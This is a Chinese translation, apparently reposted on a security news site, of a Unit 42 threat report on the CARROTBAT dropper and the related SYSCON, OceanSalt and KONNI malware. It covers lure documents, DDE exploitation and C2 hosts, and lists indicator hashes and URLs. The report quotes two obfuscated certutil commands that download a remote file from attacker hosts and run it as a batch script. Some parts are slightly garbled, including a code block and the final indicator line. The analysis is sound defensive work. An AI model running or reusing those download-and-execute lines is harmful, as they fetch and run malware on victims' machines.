@@ -1,0 +1,306 @@
+# CARROTBAT家族针对东南亚地区发起攻击
+
+阅读量 **299537**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2018-12-04 14:30:52
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章原作者 paloaltonetworks，文章来源：researchcenter.paloaltonetworks.com
+
+原文地址：<https://researchcenter.paloaltonetworks.com/2018/11/unit42-the-fractured-block-campaign-carrotbat-malware-used-to-deliver-malware-targeting-southeast-asia/>
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p5.ssl.qhimg.com/t010a9deee4356a2aad.jpg)
+
+Unit
+42近期发现了一项针对与韩国和朝鲜地区进行的钓鱼活动，钓鱼内容围绕一系列主题展开，主要包括：加密货币，加密货币交易和政治事件。根据被投递的恶意载荷中所包含的有关信息，Unit
+42将这个恶意软件家族命名为了CARROTBAT。
+
+CARROTBAT家族的样本最早在2017年12月的一次攻击中被发现的，此次攻击是针对英国政府机构展开的，主要利用了SYSCON家族恶意软件，尽管没有明确证据表明CARROTBAT在攻击中被使用，但是研究人员还是通过攻击设备的行为重叠来确认出了CARROTBAT家族，并发现了它与SYSCON家族系列软件的联系。而此次攻击事件的主角SYSCON是一款简单的远程访问木马（RAT），它使用文件传输协议（FTP）进行网络通信，具体报道见于[https://blog.trendmicro.com/trendlabs-security-intelligence/syscon-backdoor-uses-ftp-as-a-cc-channel/。](https://blog.trendmicro.com/trendlabs-security-intelligence/syscon-backdoor-uses-ftp-as-a-cc-channel/%E3%80%82)
+
+迄今为止，一共识别出了29种不同的CARROTBAT样本，其中包含12种已确认的不同诱饵文件。这些样本于今年3月开始出现，在过去的3个月内进行了大量的活动。与先前投递的SYSCON家族恶意软件不同，新的攻击活动投递了OceanSalt（[https://www.mcafee.com/enterprise/en-us/assets/reports/rp-operation-oceansalt.pdf）家族恶意软件。我们将CARROTBAT及其投递的相关载荷合并称之为Fractured](https://www.mcafee.com/enterprise/en-us/assets/reports/rp-operation-oceansalt.pdf%EF%BC%89%E5%AE%B6%E6%97%8F%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E3%80%82%E6%88%91%E4%BB%AC%E5%B0%86CARROTBAT%E5%8F%8A%E5%85%B6%E6%8A%95%E9%80%92%E7%9A%84%E7%9B%B8%E5%85%B3%E8%BD%BD%E8%8D%B7%E5%90%88%E5%B9%B6%E7%A7%B0%E4%B9%8B%E4%B8%BAFractured)
+Block。
+
+## 攻击过程
+
+2017年12月13日，yuri.sidorav[@yandex](https://github.com/yandex
+"@yandex")[.]ru向英国政府机构内的高级人员发送了一封鱼叉钓鱼邮件。此电子邮件的主题是“我们会在没有先决条件的情况下与朝鲜对话”，此邮件的附件文件也使用了同样的命名方式。
+
+在附件Word中显示了如下内容：
+
+> 美国将“无条件地”与朝鲜对话
+
+文章主要讨论了美国与朝鲜之间的外交关系，并且引用了NKNews[.]org当天发布的文章（文章链接为：<https://www.nknews.org/2017/12/u-s-would-talk-with-north-korea-without-precondition-tillerson/> ）。被引用的文章内容为：
+
+![](https://p4.ssl.qhimg.com/t01364e14a1c9fb577b.png)
+
+附件文档利用DDE漏洞（漏洞介绍：[https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/）执行了以下代码：](https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/%EF%BC%89%E6%89%A7%E8%A1%8C%E4%BA%86%E4%BB%A5%E4%B8%8B%E4%BB%A3%E7%A0%81%EF%BC%9A)
+
+    
+    
+    https://researchcenter.paloaltonetworks.com/2018/11/unit42-the-fractured-block-campaign-carrotbat-malware-used-to-deliver-malware-targeting-southeast-asia/
+
+DDE漏洞首次在2017年5月被利用于恶意攻击。攻击样本中包含下载名为0_31.doc的远程可执行文件的命令，文件被下载后以AAA.exe的文件名形式命名，并放在在受害者的％TEMP％目录中。  
+被划定到SYSCON家族的恶意载荷通过FTP服务器与ftp.bytehost31[.]org via这个恶意服务器进行连接，以接收远程控制命令。
+
+![](https://p4.ssl.qhimg.com/t0147a4129490d77c0c.png)
+
+通过对恶意样本中的域名881.000webhostapp[.]com进行关联，又关联出了一批样本，其中包括KONNI恶意软件系列样本和4个CARROTBAT恶意软件系列样本（64位可执行文件）。根据特征进行筛选，最终筛选出了29个不同样本。
+
+## Fractured Block攻击
+
+迄今为止，所有的CARROTBAT样本都是包含在Fractured
+Block攻击里的。CARROTBAT用于投递载荷来帮助攻击者投递并打开一个嵌入式诱饵文件，然后执行一个命令，该命令将在目标机器上下载并运行一个有效负载。此恶意软件支持以下11种诱饵文档文件格式：
+
+    
+    
+    .doc
+    .docx
+    .eml
+    .hwp
+    .jpg
+    .pdf
+    .png
+    .ppt
+    .pptx
+    .xls
+    .xlsx
+
+在打开嵌入式诱饵文档后，会在系统上执行以下混淆命令：
+
+    
+    
+    C: && cd %TEMP% && c^e^r^tutil -urlca^che -spl^it -f https://881.000webhostapp[.]com/1.txt && ren 1.txt 1.bat && 1.bat && exit
+
+此命令将尝试通过Microsoft Windows内置的certutil实用程序下载并执行远程文件。
+
+通过对根据行为判别所找到的29个样本的编译时间戳进行研究，发现它们均在2018年3月到2018年9月之间，其中的11个被用于了实际的攻击过程。样本的编译时间戳如下图所示：
+
+![](https://p0.ssl.qhimg.com/t0158ead58e598a5dd0.png)
+
+针对韩国受害者的大多数诱饵文件都有与加密货币的主题相关。在其中的一个案例中，诱饵文件包含了在COINVIL工作的个人名片，该组织宣布计划于2018年5月在菲律宾建立加密货币交易所。其他诱饵主题包括时事政治事件，如美国和朝鲜之间的关系，以及美国总统唐纳德特朗普访问新加坡峰会。CARROTBAT所投递的恶意载荷各不相同，在2018年3月到2018年7月期间，可以观察到所投递的多个SYSCON恶意样本，这些样本通过FTP与以下主机进行C2通信：
+
+    
+    
+    ftp.byethost7[.]com
+    ftp.byethost10[.]com
+    files.000webhost[.]com
+
+从2018年6月开始，我们观察到CARROTBAT开始投递OceanSalt恶意软件。在撰写本文时，这些样本仍处于活动状态，并与61.14.210[.]72:7117进行C2通信。
+
+## 与其他威胁活动的关联
+
+CARROTBAT和KONNI恶意软件之间存在一些服务器重叠。KONNI是一种远程访问木马，已经活跃了四年之久，具有广泛的功能，通常利用000webhost等免费网络托管服务提供商的服务器作为其C2地址。在撰写本文时，这个特定的恶意软件系列尚未被归类为一个家族，但是该软件的攻击目标一直集中在东南亚地区。
+
+上文反复提到的另一种关联是SYSCON恶意软件。这个恶意软件首次在2017年10月被报道，并且已经观察到了攻击中提供了与朝鲜有关的诱饵文件。此款恶意软件通常比较简单，利用远程FTP服务器进行C2通信。在下面的恶意活动关联图中，黄色的表示KONNI，紫色的表示SYSCON。
+
+![](https://p5.ssl.qhimg.com/t013df6801bdae79b84.png)
+
+该家族与OceanSalt恶意软件有效载荷也可能有一定关联。McAfee在2018年10月首次进行了攻击报道，受害者包括韩国、美国和加拿大。与McAfee报告中列出的样本信息一样，在Fractured
+Block 攻击中观察到的OceanSalt样本使用与Comment
+Crew（又名APT1）相同的代码，但是研究人员认为这些相似的代码是错误的标志。Comment
+Crew使用的恶意软件已经活跃了多年，因此研究人员表示此次活动与Crew活动的关联性存疑。相关威胁活动的时间重叠表：
+
+![](https://p3.ssl.qhimg.com/t01897d843170ac4e94.png)
+
+## 结论
+
+CARROTBAT是识别Fractured
+Block攻击活动的关键。通过寻找CARROTBAT，我们能够找到相关的OceanSalt，SYSCON和KONNI活动。由于这些活动具备一些特征重叠，因此我们怀疑这种威胁活动可能是由同一个攻击组织发起的。但是，目前没有确凿证据。CARROTBAT恶意软件是一种较为独特的载荷投递器，虽然它支持各种类型的诱饵文件，并采用基本的命令混淆，但它并不复杂。
+
+## CARROTBAT技术分析
+
+样本信息为：
+
+MD5：3e4015366126dcdbdcc8b5c508a6d25c
+
+SHA1：f459f9cfbd10b136cafb19cbc233a4c8342ad984
+
+SHA256：aef92be267a05cbff83aec0f23d33dfe0c4cdc71f9a424f5a2e59ba62b7091de
+
+文件类型：PE32可执行文件（GUI）Intel 80386，适用于MS Windows
+
+编译时间戳 2018-09-05 00:17:22 UTC
+
+执行时，恶意软件将读取自身的最后8个字节。这些字节包括两个DWORD，它们既包含嵌入的诱饵文档的长度，也包含它的文件类型。
+
+![](https://p0.ssl.qhimg.com/t0199b11e810ab47a60.png)
+
+根据这些收集到的信息，CARROTBAT减去先前检索的8个字节后继续读取自身的结尾。数据包含整个嵌入式诱饵文档，并写入与原始恶意软件相同的目录和文件名。但是会根据先前检索的文件类型值更改文件扩展名，对应值为：
+
+在此样本中使用了.hwp文件扩展名的文档作为诱饵文档。在诱饵文件被放入到磁盘后，它将在一个新进程中被打开。随后会给受害者显示这个.hwp诱饵文档：BKN
+Bank加密货币交易的白皮书。
+
+![](https://p4.ssl.qhimg.com/t0170659157362da6ec.png)
+
+在显示此文档后，恶意软件将继续在新进程中执行以下命令：
+
+    
+    
+    C: && cd %TEMP% && c^e^r^tutil -urlca^che -spl^it -f http://s8877.1apps[.]com/vip/1.txt && ren 1.txt 1.bat && 1.bat && exit
+
+此命令将使用内置的Microsoft Windows certutil命令下载远程文件。在这个样本中，将检索以下脚本：
+
+![](https://p2.ssl.qhimg.com/t01fd327fa831d4cb7d.png)
+
+该脚本会检查受害者的操作系统，并使用certutil可执行文件再次下载相应的有效负载。
+
+![](https://p5.ssl.qhimg.com/t01f2792d1bf39a8b25.png)
+
+在本样本中，有效载荷通过base64进行编码，通过certutil进行解码。恶意载荷是一个CAB文件，在解压缩后，恶意软件会执行提取的install.bat脚本，最后删除原始文件并退出。
+
+下载的CAB文件信息为：
+
+MD5：a943e196b83c4acd9c5ce13e4c43b4f4
+
+SHA1：e66e416f300c7efb90c383a7630c9cfe901ff9fd
+
+SHA256：cfe436c1f0ce5eb7ac61b32cd073cc4e4b21d5016ceef77575bef2c2783c2d62
+
+文件类型：Microsoft Cabinet归档数据，共181248字节，3个文件
+
+上文提到的所删除的文件共有三个，分别是：
+
+  1. INSTALL.BAT（用于安装批处理脚本，负责将其他文件复制到C： Users Public Downloads并设置Run注册表项以确保持久性。它还负责在退出之前删除任何原始文件。）
+  2. DrvUpdate.dll（OceanSalt恶意软件）
+  3. winnet.ini（C2信息）
+
+C2信息在外部winnet.ini文件中存储，并使用增量的XOR密钥进行编码。用Python编写的以下函数可解码此文件：
+
+![](https://p3.ssl.qhimg.com/t01f8d656f0aceca901.png)
+
+解码后，研究人员发现此OceanSalt病毒尝试通过端口7117与61.14.210 [.] 72进行通信。
+
+## IOC
+
+### CARROTBAT样本
+
+    
+    
+    d34aabf20ccd93df9d43838cea41a7e243009a3ef055966cb9dea75d84b2724d
+    8b6b4a0e0945c6daf3ebc8870e3bd37e54751f95162232d85dc0a0cc8bead9aa
+    26fc6fa6acc942d186a31dc62be0de5e07d6201bdff5d7b2f1a7521d1d909847
+    e218b19252f242a8f10990ddb749f34430d3d7697cbfb6808542f609d2cbf828
+    824f79a8ee7d8a23a0371fab83de44db6014f4d9bdea90b47620064e232fd3e3
+    70106ebdbf4411c32596dae3f1ff7bf192b81b0809f8ed1435122bc2a33a2e22
+    87c50166f2ac41bec7b0f3e3dba20c7264ae83b13e9a6489055912d4201cbdfc
+    ac23017efc19804de64317cbc90efd63e814b5bb168c300cfec4cfdedf376f4f
+    d965627a12063172f12d5375c449c3eef505fde1ce4f5566e27ef2882002b5d0
+    7d443434c302431734caf1d034c054ad80493c4c703d5aaeafa4a931a496b2ae
+    1142dcc02b9ef34dca2f28c22613a0489a653eb0aeafe1370ca4c00200d479e0
+    337b8c2aac80a44f4e7f253a149c65312bc952661169066fe1d4c113348cc27b
+    92b45e9a3f26b2eef4a86f3dae029f5821cffec78c6c64334055d75dbf2a62ef
+    42e18ef3aaadac5b40a37ec0b3686c0c2976d65c978a2b685fefe50662876ded
+    ba78f0a6ce53682942e97b5ad7ec76a2383468a8b6cd5771209812b6410f10cb
+    dca9bd1c2d068fc9c84a754e4dcf703629fbe2aa33a089cb50a7e33e073f5cea
+    7d8376057a937573c099e3afe2d8e4b8ec8cb17e46583a2cab1a4ac4b8be1c97
+    3cbccb059225669dcfdc7542ce28666e0b1a227714eaf4b16869808bffe90b96
+    aef92be267a05cbff83aec0f23d33dfe0c4cdc71f9a424f5a2e59ba62b7091de
+    2547b958f7725539e9bba2a1852a163100daa1927bb621b2837bb88007857a48
+    6c591dddd05a2462e252997dc9d1ba09a9d9049df564d00070c7da36e526a66a
+    22b16fa7af7b51880faceb33dd556242331daf7b7749cabd9d7c9735fb56aa10
+    3869c738fa80b1e127f97c0afdb6c2e1c15115f183480777977b8422561980dd
+    ba100e7bac8672b9fd73f2d0b7f419378f81ffb56830f6e27079cb4a064ba39a
+    e527ade24beacb2ef940210ba9acb21073e2b0dadcd92f1b8f6acd72b523c828
+    9fa69bdc731015aa7bdd86cd311443e6f829fa27a9ba0adcd49fa773fb5e7fa9
+    ffd1e66c2385dae0bb6dda186f004800eb6ceaed132aec2ea42b1ddcf12a5c4e
+    e3b45b2e5d3e37f8774ae22a21738ae345e44c07ff58f1ab7178a3a43590fddd
+    a0f53abde0d15497776e975842e7df350d155b8e63d872a914581314aaa9c1dc
+
+### SYSCON 载荷样本
+
+    
+    
+    5a2c53a20fd66467e87290f5845a5c7d6aa8d460426abd30d4a6adcffca06b8b
+    fceceb104bed6c8e85fff87b1bf06fde5b4a57fe7240b562a51727a37034f659
+    fa712f2bebf30592dd9bba4fc3befced4c727b85a036550fc3ac70d1965f8de5
+    da94a331424bc1074512f12d7d98dc5d8c5028821dfcbe83f67f49743ae70652
+    2efdd25a8a8f21c661aab2d4110cd7f89cf343ec6a8674ff20a37a1750708f27
+    62886d8b9289bd92c9b899515ff0c12966b96dd3e4b69a00264da50248254bb7
+    f27d640283372eb805df794ae700c25f789d77165bb98b7174ee03a617a566d4
+    0bb099849ed7076177aa8678de65393ef0d66e026ad5ab6805c1c47222f26358
+    f4c00cc0d7872fb756e2dc902f1a22d14885bf283c8e183a81b2927b363f5084
+    e8381f037a8f70d8fc3ee11a7bec98d6406a289e1372c8ce21cf00e55487dafc
+    1c8351ff968f16ee904031f6fba8628af5ca0db01b9d775137076ead54155968
+    2da750b50ac396a41e99752d791d106b686be10c27c6933f0d3afe762d6d0c48
+    5d1388c23c94489d2a166a429b8802d726298be7eb0c95585f2759cebad040cf
+    0490e7d24defc2f0a4239e76197f1cba50e7ce4e092080d2f7db13ea0f88120b
+
+### OceanSalt 载荷样本
+
+    
+    
+    5a2c53a20fd66467e87290f5845a5c7d6aa8d460426abd30d4a6adcffca06b8b
+    fceceb104bed6c8e85fff87b1bf06fde5b4a57fe7240b562a51727a37034f659
+    fa712f2bebf30592dd9bba4fc3befced4c727b85a036550fc3ac70d1965f8de5
+    da94a331424bc1074512f12d7d98dc5d8c5028821dfcbe83f67f49743ae70652
+    2efdd25a8a8f21c661aab2d4110cd7f89cf343ec6a8674ff20a37a1750708f27
+    62886d8b9289bd92c9b899515ff0c12966b96dd3e4b69a00264da50248254bb7
+    f27d640283372eb805df794ae700c25f789d77165bb98b7174ee03a617a566d4
+    0bb099849ed7076177aa8678de65393ef0d66e026ad5ab6805c1c47222f26358
+    f4c00cc0d7872fb756e2dc902f1a22d14885bf283c8e183a81b2927b363f5084
+    e8381f037a8f70d8fc3ee11a7bec98d6406a289e1372c8ce21cf00e55487dafc
+    1c8351ff968f16ee904031f6fba8628af5ca0db01b9d775137076ead54155968
+    2da750b50ac396a41e99752d791d106b686be10c27c6933f0d3afe762d6d0c48
+    5d1388c23c94489d2a166a429b8802d726298be7eb0c95585f2759cebad040cf
+    0490e7d24defc2f0a4239e76197f1cba50e7ce4e092080d2f7db13ea0f88120b
+
+### URL
+
+    
+    
+    https://881.000webhostapp[.]com/1.txt
+    http://attach10132.1apps[.]com/1.txt
+    https://071790.000webhostapp[.]com/1.txt
+    https://vnik.000webhostapp[.]com/1.txt
+    https://7077.000webhostapp[.]com/vic/1.txt
+    http://a7788.1apps[.]com/att/1.txt
+    http://s8877.1apps[.]com/vip/1.txt
+    http://hanbosston.000webhostapp[.]com/1.txt
+    http://bluemountain.1apps[.]com/1.txt
+    https://www.webmail-koryogroup[.]com/keep/1.txt
+    http://filer1.1apps[.]com/1.txt
+    ftp.byethost7[.]com
+    ftp.byethost10[.]com
+    files.000
+    webhost[.]com61.14.210[.]72:7117
+
+本文翻译自researchcenter.paloaltonetworks.com
+[原文链接](https://researchcenter.paloaltonetworks.com/2018/11/unit42-the-fractured-block-campaign-carrotbat-malware-used-to-deliver-malware-targeting-southeast-asia/)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **N0th1ng** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/167077](/post/id/167077)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自:
+[researchcenter.paloaltonetworks.com](https://researchcenter.paloaltonetworks.com/2018/11/unit42-the-fractured-block-campaign-carrotbat-malware-used-to-deliver-malware-targeting-southeast-asia/)
+
+如若转载,请注明出处： <https://researchcenter.paloaltonetworks.com/2018/11/unit42-the-fractured-block-campaign-carrotbat-malware-used-to-deliver-malware-targeting-southeast-asia/>
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [恶意软件](/tag/恶意软件)
+  * [样本分析](/tag/样本分析)
+  * [恶意活动](/tag/恶意活动)
+
+ **+1** __1赞
+
+ __收藏
+
+![](https://p5.ssl.qhimg.com/t01ad2698c7dbe9df52.png) N0th1ng
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
